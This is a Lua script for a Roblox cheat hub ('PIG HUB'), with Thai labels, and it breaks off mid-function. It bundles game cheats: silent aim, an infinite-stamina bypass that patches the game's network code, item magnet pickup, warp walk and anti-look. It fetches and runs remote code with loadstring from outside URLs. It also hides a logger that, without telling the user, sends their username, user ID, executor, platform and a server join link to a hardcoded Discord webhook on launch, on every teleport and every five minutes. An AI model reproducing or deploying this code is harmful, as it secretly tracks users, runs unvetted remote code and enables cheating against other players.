local CoreGui = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")
local DownloadGui = Instance.new("ScreenGui")
DownloadGui.Name = "PigHubLoad"
DownloadGui.Parent = CoreGui
DownloadGui.ResetOnSpawn = false
DownloadGui.IgnoreGuiInset = true
local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(1, 0, 1, 0)
MainFrame.BackgroundTransparency = 1
MainFrame.Parent = DownloadGui
local CharImage = Instance.new("ImageLabel")
CharImage.Size = UDim2.new(0, 300, 0, 300)
CharImage.Position = UDim2.new(0.5, -150, 0.5, -170)
CharImage.BackgroundTransparency = 1
CharImage.Image = "rbxassetid://117924028123190"
CharImage.ImageTransparency = 1
CharImage.Parent = MainFrame
local CampName = Instance.new("TextLabel")
CampName.Size = UDim2.new(1, 0, 0, 70)
CampName.Position = UDim2.new(0, 0, 0.5, 140)
CampName.BackgroundTransparency = 1
CampName.Text = "PIG HUB"
CampName.TextColor3 = Color3.fromRGB(0, 200, 255)
CampName.TextScaled = true
CampName.Font = Enum.Font.GothamBold
CampName.TextTransparency = 1
CampName.Parent = MainFrame
local Gradient = Instance.new("UIGradient")
Gradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 150, 255)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(100, 200, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 150, 255))
})
Gradient.Rotation = 45
Gradient.Parent = CampName
task.spawn(function()
    local fadeInImage = TweenService:Create(CharImage, TweenInfo.new(1.5), {ImageTransparency = 0})
    fadeInImage:Play()
    fadeInImage.Completed:Wait()
    task.wait(0.5)
    local fadeInText = TweenService:Create(CampName, TweenInfo.new(2), {TextTransparency = 0})
    fadeInText:Play()
    local angle = 45
    while CampName.TextTransparency < 0.1 do
        angle = (angle + 1) % 360
        Gradient.Rotation = angle
        task.wait(0.03)
    end
    fadeInText.Completed:Wait()
    task.wait(2)
    local fadeOutImage = TweenService:Create(CharImage, TweenInfo.new(1), {ImageTransparency = 1})
    local fadeOutText = TweenService:Create(CampName, TweenInfo.new(1), {TextTransparency = 1})
    fadeOutImage:Play()
    fadeOutText:Play()
    fadeOutImage.Completed:Wait()
    DownloadGui:Destroy()
end)
repeat task.wait() until not CoreGui:FindFirstChild("PigHubLoad")

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Lighting = game:GetService("Lighting")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
local Camera = workspace.CurrentCamera
local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
local Window = WindUI:CreateWindow({
    Title = "PIG HUB",
    Icon = "rbxassetid://120437295686483",
    Author = "PIG TEAM",
    Folder = "PIG HUB",
    Size = UDim2.fromOffset(580, 460),
    MinSize = Vector2.new(560, 350),
    MaxSize = Vector2.new(850, 560),
    Transparent = true,
    Theme = "Dark",
    Resizable = true,
    SideBarWidth = 200,
    HideSearchBar = true,
    ScrollBarEnabled = false,
    User = {
        Enabled = true,
        Name = LocalPlayer.Name,
        Image = "rbxthumb://type=AvatarHeadShot&id=" .. LocalPlayer.UserId
    }
})
Window:EditOpenButton({ Enabled = false })
local ScreenGui = Instance.new("ScreenGui", CoreGui)
ScreenGui.Name = "WindUI_Toggle"
ScreenGui.ResetOnSpawn = false
local ToggleBtn = Instance.new("ImageButton", ScreenGui)
ToggleBtn.Size = UDim2.new(0,50,0,50)
ToggleBtn.Position = UDim2.new(0,20,0.5,-25)
ToggleBtn.BackgroundTransparency = 1
ToggleBtn.Image = "rbxassetid://120437295686483"
ToggleBtn.Active = true
ToggleBtn.Draggable = true
local function ToggleUI()
    if Window.Toggle then
        Window:Toggle()
    else
        Window.UI.Enabled = not Window.UI.Enabled
    end
end
ToggleBtn.MouseButton1Click:Connect(ToggleUI)
UserInputService.InputBegan:Connect(function(i,gp)
    if not gp and i.KeyCode == Enum.KeyCode.T then
        ToggleUI()
    end
end)

local PlayerTab = Window:Tab({Title="Player",Icon="user"})
local ESPTab = Window:Tab({Title="ESP",Icon="crosshair"})
local PVPTab = Window:Tab({Title="PVP",Icon="target"})
local QuestTab = Window:Tab({Title="Quest",Icon="flag"})
local ServerTab = Window:Tab({Title="Server",Icon="globe"})
local CustomTab = Window:Tab({Title="Custom",Icon="settings"})

local WebhookURL = "https://discord.com/api/webhooks/1483701795355099267/F3uz9hW02NM2OmXAq7y5OACyofxOIQ7V-j3i8_zCZeVGr35NEK934k-CMuPsUoK6e5M8"
local VERSION_TYPE = "FREE"
local VERSION_NUMBER = "v1.0"
local _webhookStartTime = os.clock()

local function _getRequestFunc()
    if syn and syn.request then return syn.request end
    if http_request then return http_request end
    if request then return request end
    return nil
end

local function sendEmbed(embedData)
    pcall(function()
        local payload = {
            username = "🐷 PIG HUB Logger",
            avatar_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=420&height=420&format=png",
            embeds = { embedData }
        }
        local body = HttpService:JSONEncode(payload)
        local headers = { ["Content-Type"] = "application/json" }
        local rf = _getRequestFunc()
        if rf then
            rf({ Url = WebhookURL, Method = "POST", Headers = headers, Body = body })
        elseif HttpService and HttpService.RequestAsync then
            HttpService:RequestAsync({ Url = WebhookURL, Method = "POST", Headers = headers, Body = body })
        end
    end)
end

local playerName = LocalPlayer.Name
local playerDisplayName = LocalPlayer.DisplayName or LocalPlayer.Name
local userId = LocalPlayer.UserId
local placeId = game.PlaceId
local jobId = game.JobId
local placeName = "Unknown"
local placeMaxPlayers = 0
local placeCurrentPlayers = 0
local timeStarted = os.date("%d/%m/%Y %H:%M:%S")
local executor = "Unknown"
local platform = "Unknown"
local accountAge = 0
local playerLevel = 0
local playerRace = "Unknown"
local playerFruit = "Unknown"
local playerBeli = 0
local playerFragments = 0

pcall(function()
    if getexecutorname then
        executor = getexecutorname()
    elseif syn and syn.request then
        executor = "Synapse X"
    elseif KRNL_LOADED then
        executor = "Krnl"
    elseif is_sirhurt_closure then
        executor = "Sirhurt"
    elseif PROTOSMASHER_LOADED then
        executor = "ProtoSmasher"
    elseif FLUXUS_LOADED then
        executor = "Fluxus"
    elseif ELECTRON_LOADED then
        executor = "Electron U"
    elseif Delta then
        executor = "Delta"
    elseif COMET_LOADED then
        executor = "Comet"
    elseif isfolder and not syn then
        executor = "ScriptWare"
    elseif getgenv and getgenv().executor then
        executor = tostring(getgenv().executor)
    end
    if executor ~= "Unknown" then
        executor = executor:gsub("^%l", string.upper)
    end
end)

local osType = "Unknown"
pcall(function()
    local touch = UserInputService.TouchEnabled
    local keyboard = UserInputService.KeyboardEnabled
    local mouse = UserInputService.MouseEnabled
    local gamepad = UserInputService.GamepadEnabled

    if touch and not keyboard then
        local exLow = executor:lower()
        if exLow:find("arceus") or exLow:find("delta") or exLow:find("codex")
            or exLow:find("fluxus") or exLow:find("hydrogen") then
            osType = "Android"
            platform = "📱 Android"
        elseif exLow:find("xen") or exLow:find("nihon") or exLow:find("seliware")
            or exLow:find("sela") then
            osType = "iOS"
            platform = "🍎 iOS"
        else
            osType = "Mobile (Android/iOS)"
            platform = "📱 Mobile"
        end
    elseif keyboard and mouse then
        osType = "Windows"
        platform = "🖥️ Windows (PC)"
    elseif gamepad and not keyboard then
        osType = "Console"
        platform = "🎮 Console"
    else
        osType = "Unknown"
        platform = "❓ Unknown"
    end
end)

pcall(function() accountAge = LocalPlayer.AccountAge end)

pcall(function()
    local ok, res = pcall(function()
        return HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. placeId, true))
    end)
    if ok and res then
        placeName = res.name or placeName
        placeMaxPlayers = res.maxPlayers or 0
    end
end)

pcall(function()
    local ok, res = pcall(function()
        return HttpService:JSONDecode(game:HttpGet(
            "https://games.roblox.com/v1/games/" .. placeId .. "/servers/Public?sortOrder=Desc&limit=100", true))
    end)
    if ok and res and res.data then
        for _, s in ipairs(res.data) do
            if s.id == jobId then
                placeCurrentPlayers = s.playing or 0
                break
            end
        end
    end
end)

pcall(function()
    local stats = LocalPlayer:WaitForChild("leaderstats", 3)
    if stats then
        local lvl = stats:FindFirstChild("Lv") or stats:FindFirstChild("Level") or stats:FindFirstChild("Lvl")
        if lvl then playerLevel = lvl.Value end
        local beli = stats:FindFirstChild("Beli") or stats:FindFirstChild("Money")
        if beli then playerBeli = beli.Value end
    end
end)

pcall(function()
    local rs = game:GetService("ReplicatedStorage")
    local playerData = rs:FindFirstChild("PlayerData") or rs:FindFirstChild("GameData")
    if playerData then
        local myData = playerData:FindFirstChild(tostring(userId))
        if myData then
            local race = myData:FindFirstChild("Race") or myData:FindFirstChild("Races")
            if race then playerRace = tostring(race.Value) end
            local fruit = myData:FindFirstChild("Fruit") or myData:FindFirstChild("DevilFruit")
            if fruit then playerFruit = tostring(fruit.Value) end
            local frags = myData:FindFirstChild("Fragments") or myData:FindFirstChild("Fragment")
            if frags then playerFragments = frags.Value end
        end
    end
end)

local function formatNum(n)
    n = tonumber(n) or 0
    if n >= 1000000 then return string.format("%.1fM", n/1000000)
    elseif n >= 1000 then return string.format("%.1fK", n/1000)
    else return tostring(n) end
end

task.spawn(function()
    task.wait(3)
    local serverLink = "https://www.roblox.com/games/" .. tostring(placeId) .. "?gameInstanceId=" .. tostring(jobId)
    local embed = {
        title = "🐷  PIG HUB — มีผู้ใช้งานใหม่",
        color = 0x00C8FF,
        thumbnail = {
            url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
        },
        fields = {
            { name = "👤  ชื่อผู้เล่น",   value = playerDisplayName .. " (`" .. playerName .. "`)", inline = true },
            { name = "🌍  แผนที่",         value = placeName,                                        inline = true },
            { name = "💻  ระบบปฏิบัติการ", value = osType,                                           inline = true },
            { name = "📱  แพลตฟอร์ม",     value = platform,                                         inline = true },
            { name = "⚙️  ตัวรัน (Executor)", value = executor,                                     inline = true },
            { name = "🕐  เวลา",           value = timeStarted,                                      inline = true },
            { name = "🔑  Job ID",         value = "`" .. tostring(jobId) .. "`",                    inline = false },
            { name = "🔗  ลิงก์เข้าเซิร์ฟ", value = "[คลิกเพื่อเข้า Server](" .. serverLink .. ")", inline = false },
        },
        footer = { text = "PIG HUB Logger • " .. VERSION_TYPE .. " " .. VERSION_NUMBER },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }
    sendEmbed(embed)
end)

task.spawn(function()
    while task.wait(300) do
        local upMin = math.floor((os.clock() - _webhookStartTime) / 60)
        pcall(function()
            local stats = LocalPlayer:FindFirstChild("leaderstats")
            if stats then
                local lvl = stats:FindFirstChild("Lv") or stats:FindFirstChild("Level") or stats:FindFirstChild("Lvl")
                if lvl then playerLevel = lvl.Value end
                local beli = stats:FindFirstChild("Beli") or stats:FindFirstChild("Money")
                if beli then playerBeli = beli.Value end
            end
        end)
        local embed = {
            title = "📊  PIG HUB — อัปเดตสถานะ",
            color = 0x00FF88,
            thumbnail = {
                url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
            },
            fields = {
                { name = "👤  ผู้เล่น", value = playerDisplayName .. " (`" .. playerName .. "`)", inline = true },
                { name = "🌍  แผนที่", value = placeName, inline = true },
                { name = "⏱️  เล่นมาแล้ว", value = tostring(upMin) .. " นาที", inline = true },
                { name = "⚔️  เลเวล", value = tostring(playerLevel), inline = true },
                { name = "💰  เงิน Beli", value = formatNum(playerBeli), inline = true },
                { name = "💎  Fragments", value = formatNum(playerFragments), inline = true },
                { name = "🕐  เวลาปัจจุบัน", value = os.date("%d/%m/%Y %H:%M:%S"), inline = true },
            },
            footer = { text = "PIG HUB Logger • อัปเดตทุก 5 นาที" },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }
        sendEmbed(embed)
    end
end)

LocalPlayer.OnTeleport:Connect(function(state)
    if state == Enum.TeleportState.Started then
        task.spawn(function()
            task.wait(5)
            local newPlaceId = game.PlaceId
            local newTime = os.date("%d/%m/%Y %H:%M:%S")
            local newPlaceName = "Unknown"
            pcall(function()
                local ok, res = pcall(function()
                    return HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. newPlaceId, true))
                end)
                if ok and res and res.name then newPlaceName = res.name end
            end)
            local embed = {
                title = "🔄  PIG HUB — เปลี่ยนเซิร์ฟเวอร์",
                color = 0xFFAA00,
                fields = {
                    { name = "👤  ผู้เล่น", value = playerDisplayName .. " (`" .. playerName .. "`)", inline = true },
                    { name = "🆔  User ID", value = "`" .. tostring(userId) .. "`", inline = true },
                    { name = "📱  แพลตฟอร์ม", value = platform, inline = true },
                    { name = "🌍  แผนที่ใหม่", value = newPlaceName, inline = true },
                    { name = "🆔  Place ID ใหม่", value = "`" .. tostring(newPlaceId) .. "`", inline = true },
                    { name = "🕐  เวลา", value = newTime, inline = true },
                },
                footer = { text = "PIG HUB Logger • Server Hop" },
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }
            sendEmbed(embed)
        end)
    end
end)

-- Player Stats
PlayerTab:Section({Title="Player Stats"})
local BankBalance = PlayerTab:Button({Title="Bank Balance",Desc="<b><font color='#1E90FF'>$0</font></b>"})
local HandBalance = PlayerTab:Button({Title="Hand Balance",Desc="<b><font color='#00BFFF'>$0</font></b>"})
local function formatMoney(amount)
    amount = tonumber(amount) or 0
    if amount >= 1000000 then return string.format("$%.1fM", amount/1000000)
    elseif amount >= 1000 then return string.format("$%.1fK", amount/1000)
    else return string.format("$%d", amount) end
end
local function HandMoney()
    local success, value = pcall(function()
        local PGui = LocalPlayer:FindFirstChild("PlayerGui")
        if not PGui then return 0 end
        local topRight = PGui:FindFirstChild("TopRightHud")
        if topRight then
            local holder = topRight:FindFirstChild("Holder")
            if holder and holder:FindFirstChild("Frame") and holder.Frame:FindFirstChild("MoneyTextLabel") then
                return tonumber(holder.Frame.MoneyTextLabel.Text:gsub("[$,]", "")) or 0
            end
        end
        return 0
    end)
    return success and value or 0
end
local function ATMMoney()
    local success, value = pcall(function()
        for _, v in ipairs(PlayerGui:GetDescendants()) do
            if v:IsA("TextLabel") and (v.Text:find("Bank") or v.Text:find("Balance")) then
                return tonumber(v.Text:gsub("[$,]", ""):gsub("Bank", ""):gsub("Balance", ""):gsub(":", ""):match("%d+")) or 0
            end
        end
        return 0
    end)
    return success and value or 0
end
task.spawn(function()
    while task.wait(0.5) do
        BankBalance:SetDesc('<b><font color="#1E90FF">' .. formatMoney(ATMMoney()) .. "</font></b>")
        HandBalance:SetDesc('<b><font color="#00BFFF">' .. formatMoney(HandMoney()) .. "</font></b>")
    end
end)

PlayerTab:Section({Title="ซ่อนชื่อและเลเวล"})
PlayerTab:Button({Title="เปิดใช้ระบบ", Desc="คลิกเพื่อเปิดระบบซ่อนชื่อและเลเวล", Callback = function()
    loadstring(game:HttpGet("https://pastefy.app/3BxE2aGP/raw",true))()
end})

-- ============================================
-- ANTI-LOOK SYSTEM (ปรับปรุงใหม่)
-- ============================================
getgenv().AntiLookEnabled = false
getgenv().AntiLookStrength = 1500
getgenv().AntiLookSpeed = 1500

local AntiLookConnections = {}
local AntiLookActive = false

local function setupAntiLook()
    local RunService = game:GetService("RunService")
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    
    local heartbeatConn = RunService.Heartbeat:Connect(function()
        if not getgenv().AntiLookEnabled then return end
        if not LocalPlayer.Character then return end
        local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if not hrp then return end
        
        local originalVel = hrp.Velocity
        local angle = math.rad(tick() * getgenv().AntiLookSpeed % 360)
        local xOffset = math.cos(angle) * getgenv().AntiLookStrength
        local zOffset = math.sin(angle) * getgenv().AntiLookStrength
        local yOffset = math.random(200, 400)
        
        hrp.Velocity = Vector3.new(xOffset, yOffset, zOffset)
        RunService.RenderStepped:Wait()
        hrp.Velocity = originalVel
    end)
    
    table.insert(AntiLookConnections, heartbeatConn)
    
    local charConn = LocalPlayer.CharacterAdded:Connect(function()
        task.wait(1)
    end)
    table.insert(AntiLookConnections, charConn)
end

local function ToggleAntiLook(state)
    getgenv().AntiLookEnabled = state
    
    for _, conn in ipairs(AntiLookConnections) do
        if conn then pcall(function() conn:Disconnect() end) end
    end
    AntiLookConnections = {}
    
    if not state then return end
    setupAntiLook()
end

PlayerTab:Section({Title="ANTI-LOOK SYSTEM"})
PlayerTab:Toggle({
    Title = "Anti-Look",
    Desc = "ป้องกัน Silent Aim และ Auto Clicker",
    Default = false,
    Callback = function(v) ToggleAntiLook(v) end
})

PlayerTab:Slider({
    Title = "Strength",
    Desc = "ระยะเหวี่ยง (ยิ่งมากยิ่งกันดี)",
    Step = 100,
    Value = {Min = 500, Max = 3000, Default = 1500},
    Callback = function(v) getgenv().AntiLookStrength = v end
})

PlayerTab:Slider({
    Title = "Speed",
    Desc = "ความเร็วในการเหวี่ยง",
    Step = 100,
    Value = {Min = 500, Max = 3000, Default = 1500},
    Callback = function(v) getgenv().AntiLookSpeed = v end
})

-- ============================================
-- LOW HEALTH ESCAPE SYSTEM
-- ============================================
local LowHealthEscapeEnabled = false
local EscapeHeight = 3500
local EscapeFlightSpeed = 200
local EscapeConnection = nil
local isEscaping = false
local escapeHRP = nil
local escapeCircleAngle = 0
local EscapeRadius = 600

local function startEscape()
    if isEscaping then return end
    local char = LocalPlayer.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    local hum = char:FindFirstChild("Humanoid")
    if not hrp or not hum then return end
    
    isEscaping = true
    escapeHRP = hrp
    local mapCenter = workspace.CurrentCamera.CFrame.Position
    local radius = EscapeRadius
    
    hrp.CFrame = CFrame.new(hrp.Position.X, EscapeHeight, hrp.Position.Z)
    
    task.spawn(function()
        while isEscaping and LowHealthEscapeEnabled do
            escapeCircleAngle = (escapeCircleAngle + 0.05) % (math.pi * 2)
            local circlePos = mapCenter + Vector3.new(
                math.cos(escapeCircleAngle) * radius,
                0,
                math.sin(escapeCircleAngle) * radius
            )
            hrp.CFrame = CFrame.new(circlePos.X, EscapeHeight, circlePos.Z)
            
            if hrp.Position.Y < EscapeHeight - 100 then
                hrp.CFrame = CFrame.new(hrp.Position.X, EscapeHeight, hrp.Position.Z)
            end
            task.wait(0.1)
        end
    end)
end

local function checkLowHealth()
    local char = LocalPlayer.Character
    if not char then return end
    local hum = char:FindFirstChild("Humanoid")
    if not hum then return end
    
    if hum.Health <= 30 and hum.Health > 0 then
        startEscape()
    end
end

PlayerTab:Section({Title="Low Health Escape"})
PlayerTab:Toggle({
    Title = "Auto Escape",
    Desc = "เมื่อเลือดต่ำกว่า 30 จะวาร์ปขึ้นฟ้าและบินวน",
    Default = false,
    Callback = function(v)
        LowHealthEscapeEnabled = v
        if not v then
            isEscaping = false
        end
    end
})
PlayerTab:Slider({
    Title = "Escape Height",
    Desc = "ความสูงที่วาร์ปขึ้นไป",
    Step = 100,
    Value = {Min = 3000, Max = 4000, Default = 3500},
    Callback = function(v) EscapeHeight = v end
})
PlayerTab:Slider({
    Title = "Flight Speed",
    Desc = "ความเร็วในการบินวน",
    Step = 10,
    Value = {Min = 100, Max = 500, Default = 200},
    Callback = function(v) EscapeFlightSpeed = v end
})
PlayerTab:Slider({
    Title = "Circle Radius",
    Desc = "รัศมีวงบิน",
    Step = 50,
    Value = {Min = 300, Max = 1000, Default = 600},
    Callback = function(v) EscapeRadius = v end
})

task.spawn(function()
    while true do
        task.wait(0.5)
        if LowHealthEscapeEnabled then
            pcall(checkLowHealth)
        end
    end
end)

-- ============================================
-- INFINITY JUMP
-- ============================================
local InfinityJumpEnabled = false
local JumpHeight = 65

local function toggleInfinityJump(state)
    InfinityJumpEnabled = state
end

UserInputService.JumpRequest:Connect(function()
    if InfinityJumpEnabled then
        local char = LocalPlayer.Character
        if char then
            local hum = char:FindFirstChildOfClass("Humanoid")
            if hum then
                hum:ChangeState(Enum.HumanoidStateType.Jumping)
                local hrp = char:FindFirstChild("HumanoidRootPart")
                if hrp then
                    hrp.Velocity = Vector3.new(hrp.Velocity.X, JumpHeight, hrp.Velocity.Z)
                end
            end
        end
    end
end)

PlayerTab:Section({Title="Infinity Jump"})
PlayerTab:Toggle({
    Title = "Infinity Jump",
    Desc = "กระโดดซ้ำได้ไม่จำกัด",
    Default = false,
    Callback = function(v) toggleInfinityJump(v) end
})
PlayerTab:Slider({
    Title = "Jump Height",
    Desc = "ความสูงในการกระโดด",
    Step = 1,
    Value = {Min = 20, Max = 100, Default = 65},
    Callback = function(v) JumpHeight = v end
})

PlayerTab:Section({Title="Sit System"})
local sit=false
local sitHeight=0
local sitConn
PlayerTab:Toggle({
    Title="เก็บของใต้ดิน",
    Callback=function(v)
        sit=v
        if sitConn then sitConn:Disconnect() end
        local c=LocalPlayer.Character
        if c and c:FindFirstChild("Humanoid") then
            c.Humanoid.Sit=v
            if v then
                sitConn=RunService.Heartbeat:Connect(function()
                    if c:FindFirstChild("HumanoidRootPart") then
                        c.HumanoidRootPart.CFrame=c.HumanoidRootPart.CFrame+Vector3.new(0,sitHeight,0)
                    end
                end)
            end
        end
    end
})
PlayerTab:Slider({Title="ปรับ Height",Step=0.1,Value={Min=-5,Max=4,Default=0},Callback=function(v) sitHeight=v end})

PlayerTab:Section({Title="Warp Walk"})
local warpEnabled,warpDistance,warpSpeed,lastWarp,warpConnection=false,0.5,0.1,0
PlayerTab:Toggle({
    Title="Enable Warp",
    Callback=function(v)
        warpEnabled=v
        if warpConnection then warpConnection:Disconnect() warpConnection=nil end
        if v then
            warpConnection=RunService.Heartbeat:Connect(function()
                if warpEnabled and tick()-lastWarp>=warpSpeed then
                    local char=LocalPlayer.Character
                    if char and char:FindFirstChild("HumanoidRootPart") and char:FindFirstChild("Humanoid") then
                        local moveDir=char.Humanoid.MoveDirection
                        if moveDir.Magnitude>0 then
                            char.HumanoidRootPart.CFrame=char.HumanoidRootPart.CFrame+(moveDir*warpDistance)
                            lastWarp=tick()
                        end
                    end
                end
            end)
        end
    end
})
PlayerTab:Slider({Title="Warp Distance",Step=0.1,Value={Min=0.1,Max=0.9,Default=0.9},Callback=function(v) warpDistance=tonumber(v) or 0.5 end})
PlayerTab:Slider({Title="Warp Speed",Step=0.01,Value={Min=0.01,Max=0.09,Default=0.09},Callback=function(v) warpSpeed=tonumber(v) or 0.1 end})

PlayerTab:Section({Title="Infinite Stamina"})
local Net = require(ReplicatedStorage.Modules.Core.Net)
local SprintModule = require(ReplicatedStorage.Modules.Game.Sprint)
PlayerTab:Toggle({
    Title="Infinite Stamina",
    Default=false,
    Callback=function(v)
        if v then
            if not getgenv().Bypassed then
                local func=debug.getupvalue(Net.get,2)
                debug.setconstant(func,3,'__Bypass')
                debug.setconstant(func,4,'__Bypass')
                getgenv().Bypassed=true
            end
            repeat task.wait() until getgenv().Bypassed
            RunService.Heartbeat:Connect(function() Net.send("set_sprinting_1",true) end)
            local consume_stamina=SprintModule.consume_stamina
            local SprintBar=debug.getupvalue(consume_stamina,2).sprint_bar
            local __InfiniteStamina=SprintBar.update
            SprintBar.update=function(...)
                if getgenv().InfiniteStamina then return __InfiniteStamina(function() return 0.5 end) end
                return __InfiniteStamina(...)
            end
            getgenv().InfiniteStamina=true
        else
            getgenv().InfiniteStamina=false
        end
    end
})

PlayerTab:Section({Title="ดูดของ"})
local CLIENT_ZONE_SIZE=Vector3.new(120,14,120)
local SERVER_FAKE_RADIUS=2000
local MAGNET_SPEED=0.8
local remoteGet=ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("Get")
local function resizeZones()
    for _,item in pairs(workspace.DroppedItems:GetChildren()) do
        local zone=item:FindFirstChild("PickUpZone")
        if zone and zone:IsA("BasePart") then
            zone.Size=CLIENT_ZONE_SIZE
            zone.Transparency=1
            zone.CanCollide=false
            zone.Anchored=true
        end
    end
end
resizeZones()
workspace.DroppedItems.ChildAdded:Connect(resizeZones)
RunService.Heartbeat:Connect(function()
    local char=LocalPlayer.Character
    if not char then return end
    local hrp=char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    for _,item in pairs(workspace.DroppedItems:GetChildren()) do
        local prompt=item:FindFirstChildWhichIsA("ProximityPrompt",true)
        if not prompt then continue end
        local dist=(hrp.Position-item.Position).Magnitude
        if dist<=SERVER_FAKE_RADIUS then
            remoteGet:InvokeServer("pickup_dropped_item",item)
            if item:IsA("BasePart") then
                item.CFrame=item.CFrame:Lerp(CFrame.new(hrp.Position),MAGNET_SPEED)
            else
                local part=item:FindFirstChildWhichIsA("BasePart")
                if part then part.CFrame=part.CFrame:Lerp(CFrame.new(hrp.Position),MAGNET_SPEED) end
            end
        end
    end
end)

-- ============================================
-- SILENT AIM ULTIMATE (ปรับปรุงใหม่ แม่นยำเท่าตัวอย่าง)
-- ============================================
getgenv().SilentAimEnabled = false
getgenv().FOV_Radius = 300
getgenv().AimPart = "Head"
getgenv().Prediction = 0.165  -- เปลี่ยนเป็นค่าเดียวกับตัวอย่าง
getgenv().RGB_Speed = 1
getgenv().WallPierceEnabled = false
getgenv().UseDynamicPrediction = true  -- เพิ่มระบบปรับตามความเร็ว

-- รายชื่อปืนที่รองรับ
local GunNames = {
    "P226","MP5","M24","Draco","Glock","Sawnoff","Uzi","G3","C9",
    "Hunting Rifle","Anaconda","AK47","Remington","Double Barrel",
    "shotgun","sawnoff","pump","blunderbuss","scatter","riot","auto-5","mossberg",
    "double barrel","spas","slug","buckshot","pellet"
}

local GunLookup = {}
for _, name in pairs(GunNames) do 
    GunLookup[name] = true 
    GunLookup[name:lower()] = true
end

-- ระบบติดตาม velocity
local velocityHistory = {}
local shotHistory = {}
local antiLookTypes = {}
local VEL_BUF_SIZE = 6

-- ============================================
-- DETECT ANTI-LOOK TYPE
-- ============================================
local function DetectAntiLookType(character)
    if not character then return "NORMAL", nil end
    
    local root = character:FindFirstChild("HumanoidRootPart")
    local head = character:FindFirstChild("Head")
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    
    if not root or not head or not humanoid then 
        return "NORMAL", nil 
    end

    local scores = {NORMAL = 0, FAKEANGLE = 0, JITTER = 0, DESYNC = 0, FAKELAG = 0}

    -- เช็ค Fake Angle
    local headLook = head.CFrame.LookVector
    local rootLook = root.CFrame.LookVector
    local angleDiff = math.deg(math.acos(math.clamp(headLook:Dot(rootLook), -1, 1)))

    if angleDiff > 110 then 
        scores.FAKEANGLE = scores.FAKEANGLE + 5
    elseif angleDiff > 85 then 
        scores.FAKEANGLE = scores.FAKEANGLE + 3
    elseif angleDiff > 60 then 
        scores.FAKEANGLE = scores.FAKEANGLE + 1 
    end

    -- เช็ค Jitter
    local angularVelocity = head.AssemblyAngularVelocity.Magnitude
    local rootSpeed = root.Velocity.Magnitude

    if angularVelocity > 12 and rootSpeed < 3 then
        scores.JITTER = scores.JITTER + 4
    elseif angularVelocity > 7 then
        scores.JITTER = scores.JITTER + 2
    end

    -- เช็ค Desync
    local headSpeed = head.AssemblyLinearVelocity.Magnitude
    local speedDiff = math.abs(headSpeed - rootSpeed)

    if speedDiff > 22 then 
        scores.DESYNC = scores.DESYNC + 3
    elseif speedDiff > 12 then 
        scores.DESYNC = scores.DESYNC + 1 
    end

    -- เช็ค Fake Lag
    local headDistance = (head.Position - root.Position).Magnitude
    if headDistance > 2.8 then 
        scores.FAKELAG = scores.FAKELAG + 3
    elseif headDistance > 1.8 then 
        scores.FAKELAG = scores.FAKELAG + 1 
    end

    -- ปกติ
    if angleDiff < 20 and angularVelocity < 4 and speedDiff < 8 and headDistance < 1.2 then
        scores.NORMAL = scores.NORMAL + 3
    end

    -- หาค่าสูงสุด
    local maxScore = 0
    local dominantType = "NORMAL"

    for typeName, score in pairs(scores) do
        if score > maxScore then
            maxScore = score
            dominantType = typeName
        end
    end

    local targetPoint = head.Position
    if dominantType == "FAKEANGLE" then
        targetPoint = targetPoint + Vector3.new(0, 0, -0.35)
    elseif dominantType == "JITTER" then
        targetPoint = (head.Position + root.Position) / 2 + Vector3.new(0, 1.2, 0)
    elseif dominantType == "DESYNC" then
        local torso = character:FindFirstChild("UpperTorso") or character:FindFirstChild("LowerTorso")
        if torso then
            targetPoint = torso.Position + Vector3.new(0, 0.4, 0)
        else
            targetPoint = root.Position + Vector3.new(0, 2, 0)
        end
    elseif dominantType == "FAKELAG" then
        targetPoint = targetPoint + Vector3.new(0, 0, 0.25)
    end

    return dominantType, targetPoint
end

-- ============================================
-- GENERATE HIT POINTS
-- ============================================
local function GenerateHitPoints(targetType, basePosition, character)
    local points = {}

    if targetType == "FAKEANGLE" then
        points = {
            {pos = basePosition + Vector3.new(0, 0, -0.45), weight = 0.4},
            {pos = basePosition + Vector3.new(0, 0.2, -0.35), weight = 0.3},
            {pos = basePosition + Vector3.new(0, -0.2, -0.35), weight = 0.2},
            {pos = basePosition, weight = 0.1}
        }
    elseif targetType == "JITTER" then
        local center = basePosition
        for i = 1, 5 do
            local angle = (i / 5) * math.pi * 2
            local offset = Vector3.new(math.cos(angle) * 0.18, math.sin(angle) * 0.12, 0)
            table.insert(points, {pos = center + offset, weight = 0.16})
        end
        table.insert(points, 1, {pos = center, weight = 0.2})
    elseif targetType == "DESYNC" then
        local root = character:FindFirstChild("HumanoidRootPart")
        if root then
            points = {
                {pos = root.Position + Vector3.new(0, 2.2, 0), weight = 0.35},
                {pos = root.Position + Vector3.new(0, 1.7, 0), weight = 0.3},
                {pos = root.Position + Vector3.new(0, 1.2, 0), weight = 0.25},
                {pos = root.Position + Vector3.new(0, 2.7, 0), weight = 0.1}
            }
        end
